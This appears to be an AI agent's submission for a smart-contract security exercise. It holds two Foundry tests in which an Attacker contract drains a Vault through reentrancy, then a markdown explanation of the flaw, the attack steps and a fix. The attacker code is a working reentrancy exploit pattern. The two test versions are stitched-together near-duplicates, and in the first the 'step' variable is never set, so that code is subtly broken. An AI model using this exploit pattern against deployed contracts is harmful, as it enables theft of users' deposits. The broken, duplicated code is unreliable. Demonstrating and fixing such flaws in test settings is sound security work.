// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public step;

    constructor(Vault _vault) payable {
        vault = _vault;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        // Balance is still non-zero here: re-enter withdraw() again and again.
        if (address(vault).balance >= step) {
            vault.withdraw();
        }
    }
}

contract VaultReentrancyTest is Test {
    Vault vault;
    Attacker attacker;
    address victim = address(0xBEEF);

    function setUp() public {
        vault = new Vault();
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function testReentrancyDrainsVault() public {
        uint256 vaultBefore = address(vault).balance;
        assertEq(vaultBefore, 10 ether);

        attacker = new Attacker(vault);
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        uint256 stolen = address(attacker).balance;
        emit log_named_uint("vault balance after", address(vault).balance);
        emit log_named_uint("attacker balance after", stolen);

        // Attacker put in 1 ether but got out ~11 ether.
        assertGt(stolen, 10.9 ether);
        assertLt(address(vault).balance, 1 ether);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public step;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        step = msg.value; // amount we withdraw each time
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        // `balanceOf[attacker]` is still `step` here: re-enter withdraw() again.
        if (address(vault).balance >= step) {
            vault.withdraw();
        }
    }
}

contract VaultReentrancyTest is Test {
    Vault vault;
    Attacker attacker;
    address victim = address(0xBEEF);

    function setUp() public {
        vault = new Vault();
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function testReentrancyDrainsVault() public {
        assertEq(address(vault).balance, 10 ether);

        attacker = new Attacker(vault);
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        uint256 stolen = address(attacker).balance;
        emit log_named_uint("vault balance after", address(vault).balance);
        emit log_named_uint("attacker net gain (wei)", stolen - 1 ether);

        // Attacker put in 1 ether but walked away with ~11 ether.
        assertGt(stolen, 10.9 ether);
        assertLt(address(vault).balance, 1 ether);
        assertGt(stolen - 1 ether, 9.9 ether);
    }
}

args.explanation:
## What goes wrong

`Vault` is a shared piggy bank. Many people can put ETH in. Each person can later take out only what they put in, because the contract tracks a per-person number in `balanceOf`.

The function `Vault.withdraw()` pays the caller *first* and only *afterwards* sets their `balanceOf` to 0:

```solidity
uint256 amount = balanceOf[msg.sender];
require(amount > 0, "nothing to withdraw");

// BUG: external call happens before state update.
(bool ok, ) = msg.sender.call{value: amount}("");
require(ok, "transfer failed");

balanceOf[msg.sender] = 0; // too late: re-entered before this runs
```

Sending ETH to a smart contract runs that contract's `receive()` code. So the caller gets a chance to run code in the middle of `withdraw()`, while its `balanceOf` is still the old, non-zero value.

## The attack

1. A victim deposits 10 ether. The vault now holds 10 ether.
2. The attacker deploys a contract and deposits 1 ether. `balanceOf[attacker]` is 1 ether and the vault holds 11 ether.
3. The attacker calls `withdraw()`. The vault sends 1 ether. The attacker's `receive()` runs, and `balanceOf[attacker]` is *still* 1 ether.
4. Inside `receive()` the attacker calls `withdraw()` again. The vault sends another 1 ether. It repeats this loop.
5. Every re-entered call succeeds because the check `amount > 0` still passes. The loop stops only when the vault cannot pay anymore.
6. Only when the calls unwind does `balanceOf[attacker] = 0` finally run — once, for a balance that was paid out 11 times.

The attacker code is tiny:

```solidity
receive() external payable {
    // `balanceOf[attacker]` is still `step` here: re-enter withdraw() again.
    if (address(vault).balance >= step) {
        vault.withdraw();
    }
}
```

In the passing test `VaultReentrancyTest.testReentrancyDrainsVault` the attacker deposits `1 ether` and ends with `11 ether`. That is a net profit of `10 ether` — the victim's whole deposit. The vault balance drops to 0.

## Why the contract lets it happen

The order of steps is wrong. The contract changes its bookkeeping (`balanceOf`) after the external call instead of before it. This is the classic violation of "check the inputs, then update the state, then talk to the outside world". Because the number that says "you were already paid" is written last, the attacker can be paid many times for the same deposit.

## What the attacker gains

Everything in the vault. Any deposit from any other user is up for grabs for the price of one wei-sized deposit, and the loop can repeat until the vault is empty.

Fix: In `Vault.withdraw()`, set `balanceOf[msg.sender] = 0;` before the low-level `msg.sender.call{value: amount}("")` (and keep the `require(ok)` afterwards), or add a `nonReentrant` guard.

